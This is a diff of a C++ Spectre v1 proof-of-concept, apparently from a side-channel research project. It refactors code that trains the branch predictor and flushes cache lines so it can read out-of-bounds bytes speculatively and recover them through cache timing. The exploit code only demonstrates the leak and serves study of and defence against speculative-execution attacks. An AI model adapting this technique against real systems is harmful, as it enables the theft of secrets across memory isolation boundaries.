@@ -1,33 +1,21 @@
 /*
  * Copyright 2019 Google LLC
  *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
+ * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
+ * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
  *
- *   https://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
+ * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
  */
 
 #include <array>
 #include <cstring>
 #include <iostream>
+#include <memory>
 
-#include "cache_sidechannel.h"
 #include "instr.h"
-
-// Objective: given some control over accesses to the *non-secret* string
-// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
-// ever accessing it in the C++ execution model, using speculative execution and
-// side channel attacks
-//
-const char *public_data = "Hello, world!";
-const char *private_data = "It's a s3kr3t!!!";
+#include "local_content.h"
+#include "timing_array.h"
+#include "utils.h"
 
 // Leaks the byte that is physically located at &text[0] + offset, without ever
 // loading it. In the abstract machine, and in the code executed by the CPU,
@@ -37,19 +25,18 @@ const char *private_data = "It's a s3kr3t!!!";
 // Instead, the leak is performed by accessing out-of-bounds during speculative
 // execution, bypassing the bounds check by training the branch predictor to
 // think that the value will be in-range.
-static char leak_byte(const char *data, size_t offset) {
-  CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+static char LeakByte(const char *data, size_t offset) {
+  TimingArray timing_array;
   // The size needs to be unloaded from cache to force speculative execution
   // to guess the result of comparison.
   //
-  // TODO: since size_in_heap is no longer the only heap-allocated value, it
-  // should be allocated into its own unique page
+  // TODO(asteinha): since size_in_heap is no longer the only heap-allocated
+  // value, it should be allocated into its own unique page
   std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
       new size_t(strlen(data)));
 
   for (int run = 0;; ++run) {
-    sidechannel.FlushOracle();
+    timing_array.FlushFromCache();
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
@@ -62,7 +49,7 @@ static char leak_byte(const char *data, size_t offset) {
     for (size_t i = 0; i < 2048; ++i) {
       // Remove from cache so that we block on loading it from memory,
       // triggering speculative execution.
-      CLFlush(size_in_heap.get());
+      FlushDataCacheLine(size_in_heap.get());
 
       // Train the branch predictor: perform in-bounds accesses 2047 times,
       // and then use the out-of-bounds offset we _actually_ care about on the
@@ -79,19 +66,17 @@ static char leak_byte(const char *data, size_t offset) {
         // This branch was trained to always be taken during speculative
         // execution, so it's taken even on the 2048th iteration, when the
         // condition is false!
-        ForceRead(isolated_oracle.data() + static_cast<size_t>(
-            data[local_offset]));
+        ForceRead(&timing_array[data[local_offset]]);
       }
     }
 
-    std::pair<bool, char> result =
-        sidechannel.RecomputeScores(data[safe_offset]);
-    if (result.first) {
-      return result.second;
+    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
+    if (ret >= 0 && ret != data[safe_offset]) {
+      return ret;
     }
 
     if (run > 100000) {
-      std::cerr << "Does not converge " << result.second << std::endl;
+      std::cerr << "Does not converge" << std::endl;
       exit(EXIT_FAILURE);
     }
   }
@@ -105,7 +90,7 @@ int main() {
     // On at least some machines, this will print the i'th byte from
     // private_data, despite the only actually-executed memory accesses being
     // to valid bytes in public_data.
-    std::cout << leak_byte(public_data, private_offset + i);
+    std::cout << LeakByte(public_data, private_offset + i);
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
